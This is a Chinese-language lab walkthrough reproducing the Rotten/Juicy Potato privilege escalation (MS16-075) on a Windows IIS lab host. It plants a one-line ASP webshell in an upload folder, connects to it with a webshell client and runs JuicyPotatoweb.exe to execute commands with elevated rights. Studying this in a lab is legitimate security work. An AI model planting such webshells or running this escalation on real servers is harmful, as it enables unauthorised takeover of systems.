# Windows-烂土豆提权

漏洞复现-烂土豆提权(MS16-075)

**0x00 前言**

烂土豆提权，即使用CVE-2016-3225（MS16-075）漏洞进行提权，当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞。成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。攻击者登录系统后，运行一个经特殊设计的应用程序利用此漏洞，从而控制受影响的系统。

影响版本：Windows 7、Windows 8.1、Windows 10、Windows Server 2008、Windows Server 2012等，以上版本系统若未安装相应补丁，则大概率存在此漏洞。

|          | 靶机                                   | 攻击机         |
| -------- | -------------------------------------- | -------------- |
| 操作系统 | Windows 10 Version 1903                | kali           |
| IP地址   | 192.168.12.140                         | 192.168.12.135 |
| 备注     | 主机安装IIS 8.0，且已上传asp一句话木马 |                |



**0x01 搭建靶场**

```
Windows Server 2012

服务器管理器”->点击“添加角色和功能
在“服务器角色”中勾选“Web 服务器(IIS)”。
在“角色服务”中，展开“应用程序开发”，勾选“.NET Extensibility 4.5”、“ASP”等

打开默认站点所在的目录，一般为“C:\inetpub\wwwroot”，创建一个upload文件夹，并赋予相关权限。
在upload目录下创建shell.asp，内容为asp的一句话木马，此处直接模拟攻击者上传一句话木马。
 <%execute request("a")%>
```

**0x02 漏洞复现**

1、菜刀连接

2、打开虚拟终端，查看当前用户及用户权限。

```
 whoami
 whoami /priv
```

![image-20230301215526859](https://s2.loli.net/2023/03/09/EC8Uw74I6TBAMOh.png)

 此处发现其拥有SeImpersonate权限。

3、使用菜刀上传漏洞利用工具，使用WebShell版的JuicyPotato工具JuicyPotatoweb。

![image-20230301215717945](https://s2.loli.net/2023/03/09/kP3HnEibyXjszJr.png)

4、在虚拟终端中，切换到upload目录，使用JuicyPotatoweb.exe执行如下命令进行提权。

```
 JuicyPotatoweb.exe -p "whoami"
```

![image-20230301215902773](https://s2.loli.net/2023/03/09/dvIXRSecm3Dyi1O.png)